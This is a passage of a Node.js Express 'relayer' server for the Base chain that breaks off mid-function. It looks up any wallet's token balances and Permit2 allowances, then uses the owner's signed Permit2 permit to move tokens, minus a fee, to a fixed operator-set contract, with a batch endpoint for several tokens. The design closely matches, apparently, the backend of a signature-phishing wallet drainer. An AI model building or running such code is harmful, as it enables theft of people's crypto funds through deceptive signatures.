import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { ethers } from 'ethers';
import { createPublicClient, createWalletClient, http, fallback, parseAbi, encodeFunctionData, verifyTypedData } from 'viem';
import { base } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';

dotenv.config();

const app = express();

// Professional CORS configuration
app.use(cors({
  origin: '*', 
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Accept', 'Cache-Control'],
  credentials: true
}));

app.use(express.json());

function serializeError(err) {
  if (!err) return null;
  return {
    name: err.name,
    message: err.message,
    shortMessage: err.shortMessage,
    details: err.details,
    cause: err.cause ? { name: err.cause.name, message: err.cause.message } : null,
    metaMessages: err.metaMessages,
    data: err.data,
    transactionHash: err.transactionHash,
  };
}

function serializeErrorDeep(err) {
  if (!err) return null;
  const base = serializeError(err);
  return {
    ...base,
    cause: err.cause ? serializeErrorDeep(err.cause) : null,
    walk: (() => {
      const items = [];
      let cur = err;
      let i = 0;
      while (cur && i < 6) {
        items.push(serializeError(cur));
        cur = cur.cause;
        i++;
      }
      return items;
    })(),
  };
}

// Configuration
const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY;
const PROXY_CONTRACT = process.env.PROXY_CONTRACT;
const SPENDER_CONTRACT = process.env.SPENDER_CONTRACT || '0x877D82d4A5b440CF0150cAB934a8DaEAcac57211';
const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const BASE_RPC_URL = process.env.BASE_RPC_URL || 'https://mainnet.base.org';
const FEE_PERCENTAGE = parseFloat(process.env.FEE_PERCENTAGE || '0.5'); // 0.5% fee by default
const MIN_FEE_USD = parseFloat(process.env.MIN_FEE_USD || '1'); // Minimum $1 fee

if (!RELAYER_PRIVATE_KEY) {
  console.error('ERROR: RELAYER_PRIVATE_KEY is required in .env file');
  process.exit(1);
}

// Initialize viem clients
const account = privateKeyToAccount(RELAYER_PRIVATE_KEY);

const transport = fallback([
  http(process.env.BASE_RPC_URL || 'https://mainnet.base.org'),
  http('https://base.llamarpc.com'),
  http('https://base.gateway.tenderly.co'),
  http('https://developer-access-mainnet.base.org'),
], {
  rank: true,
  retryCount: 3,
  retryDelay: 1000,
});

const publicClient = createPublicClient({
  chain: base,
  transport,
});

const walletClient = createWalletClient({
  account,
  chain: base,
  transport,
});

console.log('Relayer wallet address:', account.address);

// Initialize ethers provider and signer for Permit2 calls
const ethersProvider = new ethers.JsonRpcProvider(BASE_RPC_URL);
const ethersSigner = new ethers.Wallet(RELAYER_PRIVATE_KEY, ethersProvider);

// Permit2 contract interface for ethers
const PERMIT2_INTERFACE = new ethers.Interface([
  'function permitTransferFrom(tuple(tuple(address token, uint256 amount) permitted, uint256 nonce, uint256 deadline) permit, tuple(address to, uint256 requestedAmount) transferDetails, address owner, bytes signature)',
]);

// Permit2 ABI (Correct JSON format for permitTransferFrom)
const PERMIT2_ABI = [
  {
    name: 'permitTransferFrom',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      {
        name: 'permit',
        type: 'tuple',
        components: [
          {
            name: 'permitted',
            type: 'tuple',
            components: [
              { name: 'token', type: 'address' },
              { name: 'amount', type: 'uint256' },
            ],
          },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      },
      {
        name: 'transferDetails',
        type: 'tuple',
        components: [
          { name: 'to', type: 'address' },
          { name: 'requestedAmount', type: 'uint256' },
        ],
      },
      { name: 'owner', type: 'address' },
      { name: 'signature', type: 'bytes' },
    ],
    outputs: [],
  },
  {
    name: 'allowance',
    type: 'function',
    stateMutability: 'view',
    inputs: [
      { name: 'owner', type: 'address' },
      { name: 'token', type: 'address' },
      { name: 'spender', type: 'address' },
    ],
    outputs: [
      { name: 'amount', type: 'uint160' },
      { name: 'expiration', type: 'uint48' },
      { name: 'nonce', type: 'uint48' },
    ],
  },
  // Permit2 error signatures
  {
    name: 'InvalidSignature',
    type: 'error',
    inputs: [],
  },
  {
    name: 'SignatureExpired',
    type: 'error',
    inputs: [{ name: 'deadline', type: 'uint256' }],
  },
  {
    name: 'InvalidNonce',
    type: 'error',
    inputs: [{ name: 'nonce', type: 'uint256' }],
  },
  {
    name: 'AllowanceExpired',
    type: 'error',
    inputs: [{ name: 'deadline', type: 'uint256' }],
  },
  // Unknown error from Permit2 (needs investigation)
  {
    name: 'Error815e1d64',
    type: 'error',
    inputs: [],
  },
];

// Proxy ABI (Variant B: proxy is Permit2 spender)
const PROXY_ABI = [
  {
    name: 'claim',
    type: 'function',
    stateMutability: 'nonpayable',
    inputs: [
      {
        name: 'permitted',
        type: 'tuple',
        components: [
          {
            name: 'permitted',
            type: 'tuple',
            components: [
              { name: 'token', type: 'address' },
              { name: 'amount', type: 'uint256' },
            ],
          },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      },
      {
        name: 'transferDetails',
        type: 'tuple',
        components: [
          { name: 'to', type: 'address' },
          { name: 'requestedAmount', type: 'uint256' },
        ],
      },
      { name: 'owner', type: 'address' },
      { name: 'signature', type: 'bytes' },
    ],
    outputs: [],
  },
  {
    name: 'Permit2Reverted',
    type: 'error',
    inputs: [{ name: 'reason', type: 'bytes' }],
  },
];

// ERC20 ABI
const ERC20_ABI = parseAbi([
  'function balanceOf(address owner) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
  'function transfer(address to, uint256 amount) returns (bool)',
]);

// Base tokens list
const BASE_TOKENS = [
  { symbol: 'USDC', address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913', decimals: 6, coingeckoId: 'usd-coin' },
  { symbol: 'WETH', address: '0x4200000000000000000000000000000000000006', decimals: 18, coingeckoId: 'weth' },
  { symbol: 'DAI', address: '0x50c5725949a6f0c72e6c4a641f24049a917db0cb', decimals: 18, coingeckoId: 'dai' },
  { symbol: 'BRETT', address: '0x532f27101965dd16442e59d40670faf5ebb142e4', decimals: 18, coingeckoId: 'based-brett' },
  { symbol: 'AERO', address: '0x940181a94a35a4569e4529a3cdfb74e38fd98631', decimals: 18, coingeckoId: 'aerodrome-finance' },
  { symbol: 'DEGEN', address: '0x4ed4e862860bed51a9570b96d89af5e1b0efefed', decimals: 18, coingeckoId: 'degen-base' },
  { symbol: 'ZORA', address: '0x1111111111166b7fe7bd91427724b487980afc69', decimals: 18, coingeckoId: 'zora' },
  { symbol: 'VIRTUAL', address: '0x0b3e328455c4059eeb9e3f84b5543f74e24e7e1b', decimals: 18, coingeckoId: 'virtual-protocol' },
  { symbol: 'MORPHO', address: '0xbaa5cc21fd487b8fcc2f632f3f4e8d37262a0842', decimals: 18, coingeckoId: 'morpho' },
  { symbol: 'ZRO', address: '0x6985884c4392d348587b19cb9eaaf157f13271cd', decimals: 18, coingeckoId: 'layerzero' },
  { symbol: 'CBETH', address: '0x2ae3f1ec7f1f5012cfeab0185bfc7aa3cf0dec22', decimals: 18, coingeckoId: 'coinbase-wrapped-staked-eth' },
  { symbol: 'USDbC', address: '0xd9aaec86b65d86f6a7b5b1b0c42ffa531710b6ca', decimals: 6, coingeckoId: 'usd-base-coin' },
  { symbol: 'AAVE', address: '0x63706e401c06ac8513145b7687A14804d17f814b', decimals: 18, coingeckoId: 'aave' },
];

// Calculate fee amount
function calculateFeeAmount(amount, decimals) {
  const humanAmount = parseFloat(ethers.formatUnits(amount.toString(), decimals));
  console.log(`Calculating fee for amount: ${humanAmount} (raw: ${amount.toString()})`);
  
  let feeUsd;
  if (humanAmount < (MIN_FEE_USD * 2)) {
    // For small amounts, use a percentage but ensure it's reasonable
    // Use 10% for very small amounts, otherwise FEE_PERCENTAGE
    const rate = humanAmount < 0.1 ? 0.1 : (FEE_PERCENTAGE / 100);
    feeUsd = humanAmount * rate;
  } else {
    const percentageFee = humanAmount * (FEE_PERCENTAGE / 100);
    feeUsd = Math.max(percentageFee, MIN_FEE_USD);
  }
  
  // CRITICAL: Fee must NEVER exceed or equal the total amount
  // Limit fee to max 50% of the amount to ensure netAmount is always positive
  const maxFeeAllowed = humanAmount * 0.5;
  if (feeUsd >= humanAmount || feeUsd > maxFeeAllowed) {
    console.log(`Fee ${feeUsd} was too high for amount ${humanAmount}, capping at ${maxFeeAllowed}`);
    feeUsd = maxFeeAllowed;
  }

  // Handle case where feeUsd might be 0 due to extremely small amount
  if (humanAmount > 0 && feeUsd <= 0) {
    feeUsd = humanAmount * 0.01; // Take at least 1%
  }
  
  const feeAmount = ethers.parseUnits(feeUsd.toFixed(decimals), decimals);
  console.log(`Final fee calculated: ${feeUsd} USD (raw: ${feeAmount.toString()})`);
  return feeAmount;
}

// Health check endpoint
app.get('/health', (req, res) => {
  const useProxy = Boolean(PROXY_CONTRACT && String(PROXY_CONTRACT).trim());
  const spenderAddress = useProxy ? PROXY_CONTRACT : account.address;
  res.json({ 
    status: 'ok', 
    relayerAddress: account.address,
    spenderAddress,
    proxyContract: useProxy ? PROXY_CONTRACT : null,
    useProxy,
    feePercentage: FEE_PERCENTAGE,
    minFeeUsd: MIN_FEE_USD,
  });
});

// Get relayer balance
app.get('/balance', async (req, res) => {
  try {
    const ethBalance = await publicClient.getBalance({ address: account.address });
    res.json({
      address: account.address,
      ethBalance: ethers.formatEther(ethBalance),
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/balances/:address', async (req, res) => {
  try {
    const owner = req.params.address;
    console.log('[DEBUG] Relayer: Received balance request for:', owner);
    
    if (!owner || !owner.startsWith('0x')) {
      return res.status(400).json({ error: 'Invalid or missing owner address' });
    }

    let checksummedOwner;
    try {
      checksummedOwner = ethers.getAddress(owner.slice(0, 42));
    } catch (e) {
      checksummedOwner = owner.slice(0, 42);
    }

    const balances = {};
    const tokenAllowances = {};
    const permit2Allowances = {};

    const permit2Spender = PROXY_CONTRACT && String(PROXY_CONTRACT).trim() ? PROXY_CONTRACT : SPENDER_CONTRACT;

    // 1. Fetch ETH Balance
    let ethBalance = '0';
    try {
      const balance = await publicClient.getBalance({ address: checksummedOwner });
      ethBalance = ethers.formatEther(balance);
    } catch (e) {
      console.error('[DEBUG] Relayer: ETH fetch error:', e.message);
    }

    // 2. Multicall for all token balances and allowances
    console.log('[DEBUG] Relayer: Initiating Multicall for', BASE_TOKENS.length, 'tokens...');
    
    const contracts = [];
    BASE_TOKENS.forEach(token => {
      // BalanceOf call
      contracts.push({
        address: token.address,
        abi: ERC20_ABI,
        functionName: 'balanceOf',
        args: [checksummedOwner],
      });
      // ERC20 allowance (owner -> Permit2)
      contracts.push({
        address: token.address,
        abi: ERC20_ABI,
        functionName: 'allowance',
        args: [checksummedOwner, PERMIT2_ADDRESS],
      });
      // Permit2 allowance (owner -> spender) (not required for permitTransferFrom flow, but returned for debugging)
      contracts.push({
        address: PERMIT2_ADDRESS,
        abi: PERMIT2_ABI,
        functionName: 'allowance',
        args: [checksummedOwner, token.address, permit2Spender],
      });
    });

    const results = await publicClient.multicall({
      contracts,
      allowFailure: true,
    });

    BASE_TOKENS.forEach((token, index) => {
      const balanceResult = results[index * 3];
      const tokenAllowanceResult = results[index * 3 + 1];
      const permit2AllowanceResult = results[index * 3 + 2];

      balances[token.symbol] = balanceResult.status === 'success' ? balanceResult.result.toString() : '0';
      tokenAllowances[token.symbol] = tokenAllowanceResult.status === 'success' ? tokenAllowanceResult.result.toString() : '0';
      permit2Allowances[token.symbol] = permit2AllowanceResult.status === 'success' ? (permit2AllowanceResult.result?.[0]?.toString() ?? '0') : '0';
      
      if (balances[token.symbol] !== '0') {
        console.log(`[DEBUG] Relayer: Found ${token.symbol} balance: ${balances[token.symbol]}`);
      }
    });

    console.log('[DEBUG] Relayer: Request completed successfully');
    res.json({ owner: checksummedOwner, balances, tokenAllowances, permit2Allowances, ethBalance });
  } catch (error) {
    console.error('[DEBUG] Relayer: Critical failure in /balances:', error);
    res.status(500).json({ error: error.message });
  }
});

// Endpoint to fetch prices from CoinGecko server-side (bypass CORS and 429)
app.get('/prices', async (req, res) => {
  try {
    const ids = BASE_TOKENS.map(t => t.coingeckoId).filter(id => !!id).join(',');
    console.log('Fetching prices for:', ids);
    
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000); // 5s timeout

    const response = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`,
      {
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        },
        signal: controller.signal
      }
    );
    
    clearTimeout(timeoutId);

    if (!response.ok) {
      console.warn(`CoinGecko error: ${response.status}. Returning empty prices to trigger frontend fallback.`);
      return res.json({}); // Return empty instead of 500 to let frontend use defaults
    }
    
    const data = await response.json();
    res.json(data);
  } catch (error) {
    console.error('Price fetch error detail:', error.message);
    // If it's a timeout or network error, return empty object to fallback
    res.json({}); 
  }
});

// Main endpoint to execute Permit2 transfer
app.post('/relay', async (req, res) => {
  try {
    console.log('\n=== RELAY REQUEST ===');
    const { tokenAddress, owner, amount, nonce, deadline, signature } = req.body;

    const useProxy = Boolean(PROXY_CONTRACT && String(PROXY_CONTRACT).trim());
    const spenderAddress = useProxy ? PROXY_CONTRACT : account.address;

    console.log('Token:', tokenAddress);
    console.log('Owner:', owner);
    console.log('Amount:', amount);
    console.log('Nonce:', nonce);
    console.log('Deadline:', deadline);
    console.log('Signature:', signature.slice(0, 20) + '...');

    // Find token info
    const tokenInfo = BASE_TOKENS.find(t => 
      t.address.toLowerCase() === tokenAddress.toLowerCase()
    );
    
    if (!tokenInfo) {
      console.error(`[PROFESSIONAL DEBUG] Unsupported token address: ${tokenAddress}`);
      return res.status(400).json({ error: 'Unsupported token' });
    }

    console.log(`[PROFESSIONAL DEBUG] Processing relay for ${tokenInfo.symbol} (${tokenAddress}) from ${owner}`);

    // Calculate fee
    const feeAmount = calculateFeeAmount(amount, tokenInfo.decimals);
    const netAmount = BigInt(amount) - feeAmount;

    if (netAmount <= 0) {
      return res.status(400).json({ 
        error: 'Amount too small to cover fees',
        feeAmount: feeAmount.toString(),
      });
    }

    console.log(`Fee: ${feeAmount.toString()}`);
    console.log(`Net amount: ${netAmount.toString()}`);

    if (!SPENDER_CONTRACT || !String(SPENDER_CONTRACT).trim()) {
      return res.status(500).json({ error: 'SPENDER_CONTRACT is not configured' });
    }

    const permitData = {
      tokenPermissions: {
        token: tokenAddress,
        amount: BigInt(amount),
      },
      transferDetails: {
        to: SPENDER_CONTRACT,
        requestedAmount: netAmount,
      },
      owner: owner,
      nonce: BigInt(nonce),
      deadline: BigInt(deadline),
      signature: signature,
    };

    // Verify signature before relaying using ethers.js
    try {
      const domain = {
        name: 'Permit2',
        chainId: 8453,
        verifyingContract: PERMIT2_ADDRESS,
      };
      
      const types = {
        PermitTransferFrom: [
          { name: 'permitted', type: 'TokenPermissions' },
          { name: 'spender', type: 'address' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
        TokenPermissions: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint256' },
        ],
      };
      
      const value = {
        permitted: {
          token: tokenAddress,
          amount: amount.toString(),
        },
        spender: spenderAddress,
        nonce: nonce.toString(),
        deadline: deadline.toString(),
      };
      
      const recoveredAddress = ethers.verifyTypedData(domain, types, value, signature);
      
      // Also verify with viem
      const viemDomain = {
        name: 'Permit2',
        chainId: 8453,
        verifyingContract: PERMIT2_ADDRESS,
      };
      const viemTypes = {
        TokenPermissions: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint256' },
        ],
        PermitTransferFrom: [
          { name: 'permitted', type: 'TokenPermissions' },
          { name: 'spender', type: 'address' },
          { name: 'nonce', type: 'uint256' },
          { name: 'deadline', type: 'uint256' },
        ],
      };
      const viemMessage = {
        permitted: {
          token: tokenAddress,
          amount: BigInt(amount),
        },
        spender: spenderAddress,
        nonce: BigInt(nonce),
        deadline: BigInt(deadline),
      };
      
      let viemValid = false;
      try {
        viemValid = await verifyTypedData({
          domain: viemDomain,
          types: viemTypes,
          primaryType: 'PermitTransferFrom',
          message: viemMessage,
          signature: signature,
          address: owner,
        });
      } catch (e) {
        console.log('[DEBUG] Viem verification error:', e.message);
      }
      
      // Calculate EIP-712 hash that Permit2 expects
      const eip712Hash = ethers.TypedDataEncoder.hash(domain, types, value);
      
      // Calculate type hash for PermitTransferFrom (as implemented by Permit2)
      const permitTypeHash = ethers.keccak256(
        ethers.toUtf8Bytes('PermitTransferFrom(TokenPermissions permitted,address spender,uint256 nonce,uint256 deadline)TokenPermissions(address token,uint256 amount)')
      );
      
      // Get actual Permit2 domain separator
      let permit2DomainSeparator;
      try {
        permit2DomainSeparator = await publicClient.readContract({
          address: PERMIT2_ADDRESS,
          abi: parseAbi(['function DOMAIN_SEPARATOR() view returns (bytes32)']),
          functionName: 'DOMAIN_SEPARATOR',
        });
        console.log('[DEBUG] Actual Permit2 DOMAIN_SEPARATOR:', permit2DomainSeparator);
        
        // Calculate what we think it should be
        const localDomainHash = ethers.TypedDataEncoder.hashDomain(domain);
        console.log('[DEBUG] Our calculated domain hash:', localDomainHash);
        console.log('[DEBUG] Domain match:', localDomainHash.toLowerCase() === permit2DomainSeparator.toLowerCase() ? '✅ YES' : '❌ NO');
      } catch (e) {
        console.log('[DEBUG] Could not get Permit2 domain separator:', e.message);
      }
      
      console.log('[DEBUG] Signature verification (ethers):');
      console.log('  Expected owner:', owner);
      console.log('  Recovered from signature:', recoveredAddress);
      console.log('  Match:', recoveredAddress.toLowerCase() === owner.toLowerCase() ? '✅ YES' : '❌ NO - SIGNATURE INVALID');
      console.log('  Viem verification:', viemValid ? '✅ YES' : '❌ NO');
      console.log('  Spender (msg.sender expected by Permit2):', spenderAddress);
      console.log('  EIP-712 Hash (what Permit2 checks):', eip712Hash);
      console.log('  Permit type hash:', permitTypeHash);
      console.log('  Signature:', signature);
      
      if (recoveredAddress.toLowerCase() !== owner.toLowerCase()) {
        console.error('[DEBUG] SIGNATURE MISMATCH - Permit2 will reject this');
      }
    } catch (verifyError) {
      console.error('[DEBUG] Signature verification error:', verifyError.message);
    }

    // Check ERC20 allowance before calling Permit2
    try {
      const erc20Allowance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'allowance',
        args: [owner, PERMIT2_ADDRESS],
      });
      console.log('[DEBUG] ERC20 Allowance check:');
      console.log('  Owner:', owner);
      console.log('  Spender (Permit2):', PERMIT2_ADDRESS);
      console.log('  Allowance:', erc20Allowance.toString());
      console.log('  Required:', amount);
      console.log('  Has enough:', erc20Allowance >= BigInt(amount) ? '✅ YES' : '❌ NO - NEEDS APPROVAL');
    } catch (allowanceError) {
      console.error('[DEBUG] ERC20 allowance check error:', allowanceError.message);
    }

    // Check ERC20 balance (TRANSFER_FROM_FAILED is often insufficient balance or token-level restriction)
    try {
      const erc20Balance = await publicClient.readContract({
        address: tokenAddress,
        abi: ERC20_ABI,
        functionName: 'balanceOf',
        args: [owner],
      });

      console.log('[DEBUG] ERC20 Balance check:');
      console.log('  Owner:', owner);
      console.log('  Balance:', erc20Balance.toString());
      console.log('  Permit.permitted.amount:', amount);
      console.log('  RequestedAmount (net):', netAmount.toString());
      console.log('  Has enough for requestedAmount:', erc20Balance >= netAmount ? '✅ YES' : '❌ NO - INSUFFICIENT BALANCE');

      if (erc20Balance < netAmount) {
        return res.status(400).json({
          error: 'Insufficient token balance for requestedAmount',
          balance: erc20Balance.toString(),
          requestedAmount: netAmount.toString(),
          token: tokenAddress,
        });
      }
    } catch (balanceError) {
      console.error('[DEBUG] ERC20 balance check error:', balanceError.message);
    }

    // Check Permit2 nonce/allowance for this specific spender
    try {
      const permit2Allowance = await publicClient.readContract({
        address: PERMIT2_ADDRESS,
        abi: PERMIT2_ABI,
        functionName: 'allowance',
        args: [owner, tokenAddress, SPENDER_CONTRACT],
      });
      console.log('[DEBUG] Permit2 Allowance check:');
      console.log('  Owner:', owner);
      console.log('  Token:', tokenAddress);
      console.log('  Spender:', SPENDER_CONTRACT);
      console.log('  Permit2 Amount:', permit2Allowance[0]?.toString());
      console.log('  Expiration:', permit2Allowance[1]?.toString());
      console.log('  Current Nonce:', permit2Allowance[2]?.toString());
      console.log('  Provided Nonce:', nonce);
      console.log('  Nonce match:', permit2Allowance[2]?.toString() === nonce.toString() ? '✅ YES' : '❌ NO - NONCE MISMATCH');
    } catch (p2Error) {
      console.error('[DEBUG] Permit2 allowance check error:', p2Error.message);
    }

    console.log('[PROFESSIONAL DEBUG] Permit2 Arguments Prepared:', JSON.stringify({
      tokenPermissions: { token: permitData.tokenPermissions.token, amount: permitData.tokenPermissions.amount.toString() },
      transferDetails: { to: permitData.transferDetails.to, requestedAmount: permitData.transferDetails.requestedAmount.toString() },
      owner: permitData.owner,
      nonce: permitData.nonce.toString(),
      deadline: permitData.deadline.toString(),
      signatureLength: signature.length
    }, null, 2));

    const proxyPermit = {
      permitted: {
        token: permitData.tokenPermissions.token,
        amount: permitData.tokenPermissions.amount,
      },
      nonce: permitData.nonce,
      deadline: permitData.deadline,
    };

      if (useProxy) {
        console.log('[DEBUG] Using proxy contract:', PROXY_CONTRACT);

        // Best-effort sanity check: ensure the proxy is wired to the expected Permit2 and target.
        // If the proxy was deployed with a wrong PERMIT2 address (or wrong TARGET), it will often revert
        // with empty reason data, which shows up as Permit2Reverted(0x) in our ABI.
        try {
          const proxyPermit2 = await publicClient.readContract({
            address: PROXY_CONTRACT,
            abi: parseAbi(['function PERMIT2() view returns (address)']),
            functionName: 'PERMIT2',
          });
          const proxyTarget = await publicClient.readContract({
            address: PROXY_CONTRACT,
            abi: parseAbi(['function TARGET() view returns (address)']),
            functionName: 'TARGET',
          });

          console.log('[DEBUG] Proxy wiring check:');
          console.log('  PROXY.PERMIT2():', proxyPermit2);
          console.log('  Expected PERMIT2:', PERMIT2_ADDRESS);
          console.log('  PROXY.TARGET():', proxyTarget);
          console.log('  Expected TARGET (SPENDER_CONTRACT):', SPENDER_CONTRACT);

          const permit2Ok = String(proxyPermit2).toLowerCase() === String(PERMIT2_ADDRESS).toLowerCase();
          const targetOk = String(proxyTarget).toLowerCase() === String(SPENDER_CONTRACT).toLowerCase();

          if (!permit2Ok || !targetOk) {
            return res.status(500).json({
              error: 'Proxy contract is not wired to expected Permit2/TARGET',
              proxy: PROXY_CONTRACT,
              proxyPermit2,
              expectedPermit2: PERMIT2_ADDRESS,
              proxyTarget,
              expectedTarget: SPENDER_CONTRACT,
            });
          }
        } catch (e) {
          console.log('[DEBUG] Proxy wiring check skipped/failed (PERMIT2/TARGET not readable):', e.message);
        }
      } else {
        console.log('[DEBUG] Using Permit2 directly at:', PERMIT2_ADDRESS);
      }

      // 5. Simulation with detailed error extraction
      try {
        console.log('[DEBUG] Starting simulation...');
        if (useProxy) {
          console.log('[DEBUG] Simulating proxy.claim at', PROXY_CONTRACT);
          await publicClient.simulateContract({
            address: PROXY_CONTRACT,
            abi: PROXY_ABI,
            functionName: 'claim',
            args: [
              proxyPermit,
              permitData.transferDetails,
              permitData.owner,
              permitData.signature,
            ],
            account: account.address,
          });
        } else {
          console.log('[DEBUG] Simulating permit2.permitTransferFrom at', PERMIT2_ADDRESS);
          const permitArgument = {
            permitted: permitData.tokenPermissions,
            nonce: permitData.nonce,
            deadline: permitData.deadline,
          };

          console.log('[DEBUG] Viem permit argument:', JSON.stringify(permitArgument, (k, v) => typeof v === 'bigint' ? v.toString() : v));
          
          // Compare with ethers structure
          const ethersPermitArg = {
            permitted: {
              token: tokenAddress,
              amount: amount.toString(),
            },
            nonce: nonce.toString(),
            deadline: deadline.toString(),
          };
          console.log('[DEBUG] Ethers permit argument:', ethersPermitArg);

          await publicClient.simulateContract({
            address: PERMIT2_ADDRESS,
            abi: PERMIT2_ABI,
            functionName: 'permitTransferFrom',
            args: [
              permitArgument,
              permitData.transferDetails,
              permitData.owner,
              permitData.signature,
            ],
            account: account.address,
          });
        }

        console.log('[PROFESSIONAL DEBUG] Simulation successful');
      } catch (simError) {
        console.error('[PROFESSIONAL DEBUG] Simulation FAILED');
        console.error('[DEBUG] Simulation Error Name:', simError.name);
        console.error('[DEBUG] Simulation Error Message:', simError.message);
        if (simError.cause) console.error('[DEBUG] Simulation Error Cause:', simError.cause.message);
        console.error('[DEBUG] Simulation Error Full:', serializeErrorDeep(simError));
        // Do not throw here, let the execution try and fail with better error if simulation is buggy
      }

      // 6. Execution with corrected arguments
      console.log('[PROFESSIONAL DEBUG] Sending relay transaction...');
      try {
        let txHash;
        
        if (useProxy) {
          txHash = await walletClient.writeContract({
            address: PROXY_CONTRACT,
            abi: PROXY_ABI,
            functionName: 'claim',
            args: [
              proxyPermit,
              permitData.transferDetails,
              permitData.owner,
              permitData.signature,
            ],
          });
        } else {
          // Use ethers for Permit2 to ensure consistent ABI encoding
          console.log('[DEBUG] Using ethers for permitTransferFrom');
          
          const permitArg = {
            permitted: {
              token: tokenAddress,
              amount: amount.toString(),
            },
            nonce: nonce.toString(),
            deadline: deadline.toString(),
          };
          
          const transferDetails = {
            to: SPENDER_CONTRACT,
            requestedAmount: netAmount.toString(),
          };
          
          const data = PERMIT2_INTERFACE.encodeFunctionData('permitTransferFrom', [
            permitArg,
            transferDetails,
            owner,
            signature,
          ]);
          
          console.log('[DEBUG] Encoded call data:', data.slice(0, 50) + '...');
          
          const txResponse = await ethersSigner.sendTransaction({
            to: PERMIT2_ADDRESS,
            data: data,
          });
          
          txHash = txResponse.hash;
        }

        console.log('Transaction sent:', txHash);

        const receipt = await publicClient.waitForTransactionReceipt({
          hash: txHash,
        });

        console.log('Transaction confirmed:', receipt.transactionHash);

        res.json({
          success: true,
          txHash: receipt.transactionHash,
          tokenSymbol: tokenInfo.symbol,
          amount: amount.toString(),
          feeAmount: feeAmount.toString(),
          netAmount: netAmount.toString(),
          relayerAddress: account.address,
          blockNumber: receipt.blockNumber.toString(),
        });

      } catch (txError) {
        console.error('Transaction execution failed:', txError);
        console.error('[DEBUG] Tx Error Full:', serializeErrorDeep(txError));
        res.status(500).json({
          error: 'Transaction Execution Failed',
          details: txError.shortMessage || txError.message,
          txHash: txError.transactionHash,
          debug: serializeErrorDeep(txError),
        });
      }
    } catch (error) {
      console.error('Relay top-level error:', error);
      if (!res.headersSent) {
        res.status(500).json({
          error: error.message,
          details: error.shortMessage || error.reason || 'Unknown error',
          debug: serializeError(error),
        });
      }
    }
  });

// Fallback: Direct ERC20 transfer (when Permit2 fails)
app.post('/direct-transfer', async (req, res) => {
  try {
    const {
      tokenAddress,
      owner,
      amount,
      signature, // Not used but kept for API consistency
    } = req.body;

    console.log('=== DIRECT TRANSFER REQUEST ===');
    console.log('Token:', tokenAddress);
    console.log('Owner:', owner);
    console.log('Amount:', amount);

    if (!tokenAddress || !owner || !amount) {
      return res.status(400).json({ 
        error: 'Missing required fields: tokenAddress, owner, amount' 
      });
    }

    // Find token info
    const tokenInfo = BASE_TOKENS.find(t => 
      t.address.toLowerCase() === tokenAddress.toLowerCase()
    );
    
    if (!tokenInfo) {
      return res.status(400).json({ error: 'Unsupported token' });
    }

    console.log(`Processing direct transfer for ${tokenInfo.symbol}`);

    // Calculate fee
    const feeAmount = calculateFeeAmount(amount, tokenInfo.decimals);
    const netAmount = BigInt(amount) - feeAmount;

    if (netAmount <= 0) {
      return res.status(400).json({ 
        error: 'Amount too small to cover fees',
        feeAmount: feeAmount.toString(),
      });
    }

    console.log(`Fee: ${feeAmount.toString()}`);
    console.log(`Net amount to contract: ${netAmount.toString()}`);

    try {
      // Encode the transfer call
      const transferData = encodeFunctionData({
        abi: ERC20_ABI,
        functionName: 'transfer',
        args: [SPENDER_CONTRACT, netAmount],
      });

      console.log('Transfer data encoded:', transferData.slice(0, 20) + '...');

      // Execute transfer directly from relayer (requires token to be sent to relayer first)
      const txHash = await walletClient.sendTransaction({
        to: tokenAddress,
        data: transferData,
      });

      console.log('Direct transfer transaction sent:', txHash);

      // Wait for confirmation
      const receipt = await publicClient.waitForTransactionReceipt({
        hash: txHash,
      });

      console.log('Transaction confirmed:', receipt.transactionHash);

      res.json({
        success: true,
        txHash: receipt.transactionHash,
        tokenSymbol: tokenInfo.symbol,
        amount: amount.toString(),
        feeAmount: feeAmount.toString(),
        netAmount: netAmount.toString(),
        relayerAddress: account.address,
        blockNumber: receipt.blockNumber.toString(),
        method: 'direct-transfer',
      });

    } catch (txError) {
      console.error('Direct transfer error:', txError);
      res.status(500).json({
        error: 'Direct transfer failed',
        details: txError.message,
      });
    }

  } catch (error) {
    console.error('Direct transfer endpoint error:', error);
    res.status(500).json({
      error: error.message,
      details: error.shortMessage || error.reason || 'Unknown error',
    });
  }
});
app.post('/relay-batch', async (req, res) => {
  try {
    const { transfers } = req.body; // Array of transfer objects

    if (!Array.isArray(transfers) || transfers.length === 0) {
      return res.status(400).json({ error: 'Transfers array required' });
    }

    const results = [];
    const errors = [];

    for (const transfer of transfers) {
      try {
        const result = await processSingleTransfer(transfer);
        results.push(result);
      } catch (error) {
        errors.push({
          token: transfer.tokenAddress,
          error: error.message,
        });
      }
    }

    res.json({
      success: errors.length === 0,
      results,
      errors,
      totalProcessed: results.length,
      totalFailed: errors.length,
    });

  } catch (error) {
    console.error('Batch relay error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Helper function for single transfer
async function processSingleTransfer(transfer) {
  const {
    tokenAddress,
    owner,
    amount,
    nonce,
    deadline,
    signature,
  } = transfer;

  const tokenInfo = BASE_TOKENS.find(t => 
